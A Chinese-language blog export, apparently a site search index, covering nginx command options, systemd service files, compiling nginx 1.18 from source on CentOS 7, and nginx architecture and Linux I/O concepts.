nginx/1.22.0 Usage: nginx [-?hvVtTq] [-s signal] [-p prefix] [-e filename] [-c filename] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit #显示详细版本信息和编译参数 -t : test configuration and exit #检测配置文件是否有语法错误 -T : test configuration, dump it and exit #检测配置文件语法并打印结果 -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload #向nginx发送相关信号 -p prefix : set prefix path (default: /etc/nginx/) -e filename : set error log file (default: /var/log/nginx/error.log) -c filename : set configuration file (default: /etc/nginx/nginx.conf) -g directives : set global directives out of configuration file#设置全局指令,注意和配置文件不要同时配置,否则冲突 范例：nginx命令的使用 [root@centos7 ~]# nginx -g \"worker_processes 6;\" # 启动并配置nginx进程数，与配置文件冲突 nginx: [emerg] \"worker_processes\" directive is duplicate in /etc/nginx/nginx.conf:3 [root@centos7 ~]# cat /etc/nginx/nginx.conf |grep processes #配置文件中已有配置项 worker_processes auto; [root@centos7 ~]# cat /etc/nginx/nginx.conf |grep processes #注释此配置项 #worker_processes auto; [root@centos7 ~]# nginx -g \"worker_processes 6;\" #启动nginx，开启6个worker进程。默认后台执行 [root@centos7 ~]# ps aux | grep nginx #验证结果 root 2233 0.0 0.1 49056 1156 ? Ss 17:23 0:00 nginx: master process nginx -g worker_processes 6; nginx 2234 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2235 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2236 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2237 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2238 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process nginx 2239 0.0 0.1 49444 1896 ? S 17:23 0:00 nginx: worker process root 2242 0.0 0.0 112812 980 pts/1 R+ 17:24 0:00 grep --color=auto nginx [root@centos7 ~]# nginx -s quit #关闭nginx（进程结束当前任务后自动关闭） [root@centos7 ~]# ps aux | grep nginx root 2246 0.0 0.0 112812 980 pts/1 R+ 17:26 0:00 grep --color=auto nginx [root@centos7 ~]# nginx -g 'daemon off;' #前台启动nginx，在docker中启动时有用。 ^C[root@centos7 ~]# [root@centos7 ~]# nginx -t #nginx语法检查成功 nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:2:2","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"nginx 自启动service文件 [root@centos7 ~]# rpm -ql nginx | grep service /usr/lib/systemd/system/nginx-debug.service /usr/lib/systemd/system/nginx.service [root@centos7 ~]# cat /usr/lib/systemd/system/nginx.service [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking PIDFile=/var/run/nginx.pid ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf ExecReload=/bin/sh -c \"/bin/kill -s HUP $(/bin/cat /var/run/nginx.pid)\" ExecStop=/bin/sh -c \"/bin/kill -s TERM $(/bin/cat /var/run/nginx.pid)\" [Install] WantedBy=multi-user.target ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:2:3","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"nginx 配置文件 [root@centos7 ~]# rpm -qc nginx /etc/logrotate.d/nginx /etc/nginx/conf.d/default.conf /etc/nginx/fastcgi_params /etc/nginx/mime.types /etc/nginx/nginx.conf /etc/nginx/scgi_params /etc/nginx/uwsgi_params #nginx安装目录结果 [root@centos7 ~]# tree /etc/nginx/ /etc/nginx/ ├── conf.d │ └── default.conf ├── fastcgi_params ├── mime.types ├── modules -\u003e ../../usr/lib64/nginx/modules ├── nginx.conf ├── scgi_params └── uwsgi_params 2 directories, 6 files #nginx默认配置 [root@centos7 ~]# egrep -v \"^ *#|^$\" /etc/nginx/nginx.conf user nginx; error_log /var/log/nginx/error.log notice; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log main; sendfile on; keepalive_timeout 65; include /etc/nginx/conf.d/*.conf; } ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:2:4","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"nginx 启动管理 [root@centos7 ~]# systemctl enable --now nginx #启动nginx并设置开机自启动 --利用service文件管理 Created symlink from /etc/systemd/system/multi-user.target.wants/nginx.service to /usr/lib/systemd/system/nginx.service. [root@centos7 ~]# systemctl status nginx #nginx成功运行 ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 17:42:56 CST; 7s ago Docs: http://nginx.org/en/docs/ Process: 2327 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2328 (nginx) CGroup: /system.slice/nginx.service ├─2328 nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf └─2329 nginx: worker process Jul 20 17:42:56 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 17:42:56 centos7 systemd[1]: Failed to parse PID from file /var/run/nginx.pid: Invalid argument Jul 20 17:42:56 centos7 systemd[1]: Started nginx - high performance web server. [root@centos7 ~]# nginx -s quit #使用nginx命令关闭 [root@centos7 ~]# ps aux | grep nginx #关闭成功 root 2338 0.0 0.0 112812 980 pts/1 R+ 17:43 0:00 grep --color=auto nginx [root@centos7 ~]# systemctl status nginx #nginx状态为 failed ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: failed (Result: exit-code) since Wed 2022-07-20 17:43:12 CST; 24s ago Docs: http://nginx.org/en/docs/ Process: 2333 ExecStop=/bin/sh -c /bin/kill -s TERM $(/bin/cat /var/run/nginx.pid) (code=exited, status=1/FAILURE) Process: 2327 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2328 (code=exited, status=0/SUCCESS) Jul 20 17:43:12 centos7 sh[2333]: -s, --signal \u003csig\u003e send specified signal Jul 20 17:43:12 centos7 sh[2333]: -q, --queue \u003csig\u003e use sigqueue(2) rather than kill(2) Jul 20 17:43:12 centos7 sh[2333]: -p, --pid print pids without signaling them Jul 20 17:43:12 centos7 sh[2333]: -l, --list [=\u003csignal\u003e] list signal names, or convert one to a name Jul 20 17:43:12 centos7 sh[2333]: -L, --table list signal names and numbers Jul 20 17:43:12 centos7 sh[2333]: -h, --help display this help and exit Jul 20 17:43:12 centos7 sh[2333]: -V, --version output version information and exit Jul 20 17:43:12 centos7 sh[2333]: For more details see kill(1). Jul 20 17:43:12 centos7 systemd[1]: Unit nginx.service entered failed state. Jul 20 17:43:12 centos7 systemd[1]: nginx.service failed. [root@centos7 ~]# systemctl stop nginx #使用systemctl 关闭nginx [root@centos7 ~]# systemctl status nginx ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: inactive (dead) since Wed 2022-07-20 17:47:47 CST; 1min 28s ago Docs: http://nginx.org/en/docs/ Process: 2378 ExecStop=/bin/sh -c /bin/kill -s TERM $(/bin/cat /var/run/nginx.pid) (code=exited, status=0/SUCCESS) Process: 2361 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2362 (code=exited, status=0/SUCCESS) Jul 20 17:43:51 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 17:43:51 centos7 systemd[1]: Can't open PID file /var/run/nginx.pid (yet?) after start: No such file or directory Jul 20 17:43:51 centos7 systemd[1]: Started nginx - high performance web server. Jul 20 17:47:47 centos7 systemd[1]: Stopping nginx - high performance web server... Jul 20 17:47:47 centos7 systemd[1]: Stopped nginx - high performance web server. [root@centos7 ~]# nginx #启动nginx [root@centos7 ~]# ps -ef|grep nginx #查看nginx进程已启动 root 2403 1 0 17:49 ? 00:00:00 nginx: master process nginx nginx 2404 2403 0 17:49 ? 00:00:00 nginx: worker process root 2407 2204 0 17:49 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# systemctl stop nginx #使用systemctl停止nginx [root@centos7 ~]# ps -ef|grep nginx #发现并未成功停止nginx进程 root 2403 1 0 17:49 ? 00:00:00 ngin","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:2:5","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"编译安装 nginx 编译器介绍 源码安装需要提前准备标准的编译器，GCC的全称是（GNU Compiler collection），其有GNU开发，并以GPL即LGPL许可，是自由的类UNIX即苹果电脑Mac OS X操作系统的标准编译器，因为GCC原本只能处理C语言，所以原名为GNU C语言编译器，后来得到快速发展，可以处理C++,Fortran，pascal，objective\u0002C，java以及Ada等其他语言，此外还需要Automake工具，以完成自动创建Makefile的工作，Nginx的一些模块需要依赖第三方库，比如: pcre（支持rewrite），zlib（支持gzip模块）和openssl（支持ssl模块）等。 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:3:0","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"使用官方源编译安装 官方源码包地址：https://nginx.org/en/download.html 范例：编译安装nginx [root@centos7 ~]#yum -y install gcc pcre-devel openssl-devel zlib-devel #安装工具包和依赖 [root@centos7 ~]#useradd -s /sbin/nologin nginx #添加nginx账号并配置不可登录 [root@centos7 ~]#cd /usr/local/src/ [root@centos7 src]#wget http://nginx.org/download/nginx-1.18.0.tar.gz #下载源码包 [root@centos7 src]#tar xf nginx-1.18.0.tar.gz [root@centos7 src]#cd nginx-1.18.0/ #配置编译参数并检查环境依赖（如上文提到的gcc，pcre等依赖未安装则会报错） [root@centos7 nginx-1.18.0]#./configure --prefix=/apps/nginx \\ --user=nginx \\ --group=nginx \\ --with-http_ssl_module \\ --with-http_v2_module \\ --with-http_realip_module \\ --with-http_stub_status_module \\ --with-http_gzip_static_module \\ --with-pcre \\ --with-stream \\ --with-stream_ssl_module \\ --with-stream_realip_module [root@centos7 nginx-1.18.0]#make \u0026\u0026 make install [root@centos7 nginx-1.18.0]#chown -R nginx.nginx /apps/nginx nginx安装完成后，有四个主要目录 [root@centos7 ~]# tree /apps/nginx/ /apps/nginx/ ├── conf │ ├── fastcgi.conf │ ├── fastcgi.conf.default │ ├── fastcgi_params │ ├── fastcgi_params.default │ ├── koi-utf │ ├── koi-win │ ├── mime.types │ ├── mime.types.default │ ├── nginx.conf │ ├── nginx.conf.default │ ├── scgi_params │ ├── scgi_params.default │ ├── uwsgi_params │ ├── uwsgi_params.default │ └── win-utf ├── html │ ├── 50x.html │ └── index.html ├── logs └── sbin └── nginx conf：保存nginx所有的配置文件，其中nginx.conf是nginx服务器的最核心最主要的配置文件，其他的.conf则是用来配置nginx相关的功能的，例如fastcgi功能使用的是fastcgi.conf和fastcgi_params两个文件，配置文件一般都有个模板配置文件，是文件名.default结尾，使用的时候将其复制为并将后缀default去掉即可。 html目录中保存了nginx服务器的web文件，但是可以更改为其他目录保存web文件,另外还有一个50x的web文件是默认的错误页面提示页面。 logs：用来保存nginx服务器的访问日志错误日志等日志，logs目录可以放在其他路径，比如/var/logs/nginx里面。 sbin：保存nginx二进制启动脚本，可以接受不同的参数以实现不同的功能。 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:3:1","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"验证版本及编译参数 [root@centos7 ~]# ls /apps/nginx/sbin/ #nginx二进制程序路径 nginx [root@centos7 ~]# ln -s /apps/nginx/sbin/nginx /usr/sbin/ #创建软链接到PATH路径 ln: failed to create symbolic link ‘/usr/sbin/nginx’: File exists #注意之前yum安装nginx已生成该文件，因此软连接创建失败 [root@centos7 ~]# nginx -v #查看到的是yum安装的版本 nginx version: nginx/1.22.0 #使用绝对路径查看源码安装的nginx版本（如果要使用相对路径，可自行配置环境变量PATH） [root@centos7 ~]# /apps/nginx/sbin/nginx -v nginx version: nginx/1.18.0 [root@centos7 ~]# /apps/nginx/sbin/nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin #重新创建软连接到PATH变量指向的路径下（越靠左，优先级越高） [root@centos7 ~]# ln -s /apps/nginx/sbin/nginx /usr/local/sbin/ [root@centos7 ~]# exec bash #重新加载bash程序（目的是删除上文执行nginx命令后生成的缓存） [root@centos7 ~]# nginx -v #观察到已经是源码安装的nginx版本 nginx version: nginx/1.18.0 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:3:2","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"验证安装结果 [root@centos7 ~]# nginx #启动nginx [root@centos7 ~]# ps -ef|grep nginx #进程已启动 root 5692 1 0 19:08 ? 00:00:00 nginx: master process nginx nginx 5693 5692 0 19:08 ? 00:00:00 nginx: worker process root 5695 2204 0 19:08 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# curl localhost #访问测试 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eWelcome to nginx!\u003c/title\u003e \u003cstyle\u003e body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eWelcome to nginx!\u003c/h1\u003e \u003cp\u003eIf you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u003c/p\u003e \u003cp\u003eFor online documentation and support please refer to \u003ca href=\"http://nginx.org/\"\u003enginx.org\u003c/a\u003e.\u003cbr/\u003e Commercial support is available at \u003ca href=\"http://nginx.com/\"\u003enginx.com\u003c/a\u003e.\u003c/p\u003e \u003cp\u003e\u003cem\u003eThank you for using nginx.\u003c/em\u003e\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e #关闭nginx [root@centos7 ~]# nginx -s stop [root@centos7 ~]# ps -ef|grep nginx root 5701 2204 0 19:10 pts/1 00:00:00 grep --color=auto nginx ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:3:3","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"创建nginx的service文件以实现开机自启动 #注意ExecStart和ExecReload的路径要和实际安装路径匹配 [root@centos7 ~]# cat \u003e /usr/lib/systemd/system/nginx.service \u003c\u003cEOF [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking PIDFile=/apps/nginx/run/nginx.pid ExecStart=/apps/nginx/sbin/nginx -c /apps/nginx/conf/nginx.conf ExecReload=/bin/kill -s HUP \\$MAINPID ExecStop=/bin/kill -s TERM \\$MAINPID [Install] WantedBy=multi-user.target EOF #创建缺少的目录 [root@centos7 ~]# mkdir /apps/nginx/run #修改pid文件指向的路径 [root@centos7 ~]# cat /apps/nginx/conf/nginx.conf | grep pid pid run/nginx.pid; #重新加载service文件配置 [root@centos7 ~]# systemctl daemon-reload #成功使用service文件管理nginx进程 [root@centos7 ~]# systemctl start nginx [root@centos7 ~]# systemctl status nginx ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 19:22:30 CST; 1min 10s ago Docs: http://nginx.org/en/docs/ Main PID: 5769 (nginx) CGroup: /system.slice/nginx.service ├─5769 nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf └─5770 nginx: worker process Jul 20 19:22:30 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 19:22:30 centos7 systemd[1]: Can't open PID file /var/run/nginx.pid (yet?) after start: No such file or directory #此报错可能是nginx自身的bug造成的，服务本身正常。 Jul 20 19:22:30 centos7 systemd[1]: Started nginx - high performance web server. nginx服务正常，但查看状态报错：Can’t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory 参考链接：https://blog.csdn.net/XY0918ZWQ/article/details/114165979 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/:3:4","tags":["软件安装"],"title":"Nginx安装","uri":"/posts/nginx/nginx%E5%AE%89%E8%A3%85/"},{"categories":["Nginx"],"content":"Nginx基础架构和功能简介 Nginx架构 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:0:0","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 概述 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:1:0","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 介绍 **Nginx：**engine X ，2002年开发，分为社区版和商业版(nginx plus ) 2019年3月11日 F5 Networks 6.7亿美元的价格收购 Nginx是免费的、开源的、高性能的HTTP和反向代理服务器、邮件代理服务器、以及TCP/UDP代理服务器解决了C10K问题（10K Connections），参考链接: http://www.ideawu.net/blog/archives/740.html **Nginx官网：**http://nginx.org （社区版），https://www.nginx.com/（商业版） nginx的其它的二次发行版： **Tengine：**由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。它的最终目标是打造一个高效、稳定、安全、易用的Web平台。从2011年12月开始，Tengine成为一个开源项目，官网: http://tengine.taobao.org/ **OpenResty：**基于 Nginx 与 Lua 语言的高性能 Web 平台， 章亦春团队开发，官网：http://openresty.org/cn/ ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:1:1","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 功能介绍 静态的web资源服务器，如 html，图片，js，css，txt 等静态资源 基于http/https协议的反向代理（七层） 结合FastCGI/uWSGI/SCGI等协议反向代理动态资源请求 基于tcp/udp协议反向代理（四层） imap4/pop3协议的反向代理（邮件服务器） ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:1:2","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 基础特性 模块化设计，较好的扩展性 高可靠性 支持热部署：不停机更新配置文件，升级版本，更换日志文件 低内存消耗：10000个keep-alive连接模式下的非活动连接，仅需2.5M内存 支持多种IO模型和零拷贝技术：event-driven, aio, mmap，sendfile ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:1:3","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Web 服务相关的功能 虚拟主机（server） 支持 keep-alive 和管道连接(利用一个连接做多次请求) 访问日志（支持基于日志缓冲提高其性能） url rewirte 路径别名 基于IP及用户的访问控制 支持速率限制及并发数限制 重新配置和在线升级而无须中断客户的工作进程 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:1:4","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 架构和进程 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:2:0","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 架构 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:2:1","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 进程结构 web请求处理机制 多进程方式：服务器每接收到一个客户端请求就有服务器的主进程生成一个子进程响应客户端，直到用户关闭连接，这样的优势是处理速度快，子进程之间相互独立，但是如果访问过大会导致服务器资源耗尽而无法提供请求。 多线程方式：与多进程方式类似，但是每收到一个客户端请求会有服务进程派生出一个线程来个客户方进行交互，一个线程的开销远远小于一个进程，因此多线程方式在很大程度减轻了web服务器对系统资源的要求，但是多线程也有自己的缺点，即当多个线程位于同一个进程内工作的时候，可以相互访问同样的内存地址空间，所以他们相互影响，一旦主进程挂掉则所有子线程都不能工作了，IIS服务器使用了多线程的方式，需要间隔一段时间就重启一次才能稳定。 Nginx是多进程组织模型，而且是一个由Master主进程和Worker工作进程组成。 主进程(master process)的功能： 对外接口：接收外部的操作（信号） 对内转发：根据外部的操作的不同，通过信号管理 Worker 监控：监控 worker 进程的运行状态，worker 进程异常终止后，自动重启 worker 进程 读取Nginx 配置文件并验证其有效性和正确性 建立、绑定和关闭socket连接 按照配置生成、管理和结束工作进程 接受外界指令，比如重启、升级及退出服务器等指令 不中断服务，实现平滑升级，重启服务并应用新的配置 开启日志文件，获取文件描述符 不中断服务，实现平滑升级，升级失败进行回滚处理 编译和处理perl脚本 工作进程（worker process）的功能： 所有 Worker 进程都是平等的 实际处理：网络请求，由 Worker 进程处理 Worker进程数量：一般设置为核心数，充分利用CPU资源，同时避免进程数量过多，导致进程竞争CPU资源，增加上下文切换的损耗 接受处理客户的请求, 将请求依次送入各个功能模块进行处理 I/O调用，获取响应数据 与后端服务器通信，接收后端服务器的处理结果 缓存数据，访问缓存索引，查询和调用缓存数据 发送请求结果，响应客户的请求 接收主程序指令，比如重启、升级和退出等 Nginx 工作流程 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:2:2","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 进程间通信 工作进程是由主进程生成的，主进程使用fork()函数，在Nginx服务器启动过程中主进程根据配置文件决定启动工作进程的数量，然后建立一张全局的工作表用于存放当前未退出的所有的工作进程，主进程生成工作进程后会将新生成的工作进程加入到工作进程表中，并建立一个单向的管道并将其传递给工作进程，该管道与普通的管道不同，它是由主进程指向工作进程的单向通道，包含了主进程向工作进程发出的指令、工作进程ID、工作进程在工作进程表中的索引和必要的文件描述符等信息。主进程与外界通过信号机制进行通信，当接收到需要处理的信号时，它通过管道向相关的工作进程发送正确的指令，每个工作进程都有能力捕获管道中的可读事件，当管道中有可读事件的时候，工作进程就会从管道中读取并解析指令，然后采取相应的执行动作，这样就完成了主进程与工作进程的交互。 worker进程之间的通信原理基本上和主进程与worker进程之间的通信是一样的，只要worker进程之间能够取得彼此的信息，建立管道即可通信，但是由于worker进程之间是完全隔离的，因此一个进程想要知道另外一个进程的状态信息,就只能通过主进程来实现。 为了实现worker进程之间的交互，master进程在生成worker进程之后，在worker进程表中进行遍历，将该新进程的PID以及针对该进程建立的管道句柄传递给worker进程中的其他进程，为worker进程之间的通信做准备，当worker进程1向worker进程2发送指令的时候，首先在master进程给它的其他worker进程工作信息中找到2的进程PID，然后将正确的指令写入指向进程2的管道，worker进程2捕获到管道中的事件后，解析指令并进行相关操作，这样就完成了worker进程之间的通信。 此外worker进程可以通过共享内存来通讯，比如upstream中的zone，或者limit_req、limit_conn中的zone等。操作系统提供了共享内存机制。 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:2:3","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 启动和HTTP连接建立 Nginx 启动时，Master 进程，加载配置文件 Master 进程，初始化监听的 socket Master 进程，fork 出多个 Worker 进程 Worker 进程，竞争新的连接，获胜方通过三次握手，建立 Socket 连接，并处理请求 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:2:4","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"HTTP 请求处理流程 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:2:5","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Nginx"],"content":"Nginx 模块介绍 nginx 有多种模块 核心模块：是 Nginx 服务器正常运行必不可少的模块，提供错误日志记录 、配置文件解析 、事件 驱动机制 、进程管理等核心功能 标准HTTP模块：提供 HTTP 协议解析相关的功能，比如： 端口配置 、 网页编码设置 、 HTTP响应 头设置 等等 可选HTTP模块：主要用于扩展标准的 HTTP 功能，让 Nginx 能处理一些特殊的服务，比如： Flash 多媒体传输 、解析 GeoIP 请求、 网络传输压缩 、 安全协议 SSL 支持等 邮件服务模块：主要用于支持 Nginx 的 邮件服务 ，包括对 POP3 协议、 IMAP 协议和 SMTP协议 的支持 Stream服务模块: 实现反向代理功能,包括TCP协议代理 第三方模块：是为了扩展 Nginx 服务器应用，完成开发者自定义功能，比如： Json 支持、 Lua 支 持等 nginx高度模块化，但其模块早期不支持DSO机制;1.9.11 版本支持动态装载和卸载 模块分类： 核心模块：core module 标准模块： HTTP 模块：ngx_http_* HTTP Core modules #默认功能 HTTP Optional modules #需编译时指定 Mail 模块: ngx_mail_* Stream 模块 ngx_stream_* 第三方模块 ","date":"2022-07-19","objectID":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/:3:0","tags":["Nginx"],"title":"Nginx架构简介","uri":"/posts/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/"},{"categories":["Linux"],"content":"本节内容主要用于理解Linux的I/O模型，以便更好地理解Nginx架构。 I/O的定义 I/O在计算机中指Input/Output， IOPS (Input/Output Per Second)即每秒的输入输出量(或读写次数)，是衡量磁盘性能的主要指标之一。IOPS是指单位时间内系统能处理的I/O请求数量，一般以每秒处理的I/O请求数量为单位，I/O请求通常为读或写数据操作请求。 一次完整的I/O是用户空间的进程数据与内核空间的内核数据的报文的完整交换，但是由于内核空间与用户空间是严格隔离的，所以其数据交换过程中不能由用户空间的进程直接调用内核空间的内存数据，而是需要经历一次从内核空间中的内存数据copy到用户空间的进程内存当中，所以简单说I/O就是把数据从内核空间中的内存数据复制到用户空间中进程的内存当中。 Linux 的 I/O 磁盘I/O 网络I/O : 一切皆文件,本质为对socket文件的读写 ","date":"2022-07-18","objectID":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/:0:0","tags":["I/O"],"title":"IO模型与零拷贝","uri":"/posts/linux/io%E6%A8%A1%E5%9E%8B%E4%B8%8E%E9%9B%B6%E6%8B%B7%E8%B4%9D/"},{"categories":["Linux"],"content":"磁盘 I/O 磁盘I/O是进程向内核发起系统调用，请求磁盘上的某个资源比如是html 文件或者图片，然后内核通过相应的驱动程序将目标文件加载到内核的内存空间，加载完成之后把数据从内核内存（内核空间）再复制给进程内存（用户空间），如果是比较大的数据也需要等待一定时间。 机械磁盘的寻道时间、旋转延迟和数据传输时间： 寻道时间：是指磁头移动到正确的磁道上所花费的时间，寻道时间越短则I/O处理就越快，目前磁盘的寻道时间一般在3-15毫秒左 右。 